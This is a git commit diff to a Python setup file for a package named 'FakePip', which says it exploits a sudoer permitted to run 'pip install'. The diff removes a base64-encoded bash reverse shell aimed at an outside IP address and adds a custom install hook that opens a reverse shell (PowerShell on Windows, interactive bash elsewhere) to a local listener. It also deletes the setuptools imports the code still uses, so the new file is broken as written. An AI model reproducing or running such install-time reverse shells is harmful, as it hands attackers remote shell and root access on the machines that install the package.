1dc2a917edac5a4482fadb130fed19a0ed1401d3
sdtgccc <yioghbmnb@outlook.com>
2026-01-16 13:26:16 +0900

    Update ___init__.py

--- ___init__.py
+++ ___init__.py
@@ -1,24 +1,33 @@
-from setuptools import setup
-from setuptools.command.install import install
-import base64
+import platform
 import os
+import socket
 import subprocess
-
-out=subprocess.run(["calc.exe","-p"],capture_output=True,text=True)
-print(out.stdout)
 
 class CustomInstall(install):
   def run(self):
     install.run(self)
-    LHOST = '38.180.190.115'  # change this
+    LHOST = '127.0.0.1'  
     LPORT = 9000
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((LHOST, LPORT))
     
-    reverse_shell = 'python -c "import os; import pty; import socket; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\'{LHOST}\', {LPORT})); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); os.putenv(\'HISTFILE\', \'/dev/null\'); pty.spawn(\'/bin/bash\'); s.close();"'.format(LHOST=LHOST,LPORT=LPORT)
-    encoded = base64.b64encode(reverse_shell)
-    os.system('echo %s|base64 -d|bash' % encoded)
+    if platform.system() == "Windows":
+        # Windows 反弹 shell
+        subprocess.call(
+            ["powershell.exe"],
+            stdin=s, stdout=s, stderr=s
+        )
+    else:
+        # Linux/macOS 反弹 shell
+        os.dup2(s.fileno(), 0)
+        os.dup2(s.fileno(), 1)
+        os.dup2(s.fileno(), 2)
+        subprocess.call(["/bin/bash", "-i"])
+
 
 setup(name='FakePip',
       version='0.0.1',
       description='This will exploit a sudoer able to /usr/bin/pip install *',
       zip_safe=False,
       cmdclass={'install': CustomInstall})
+
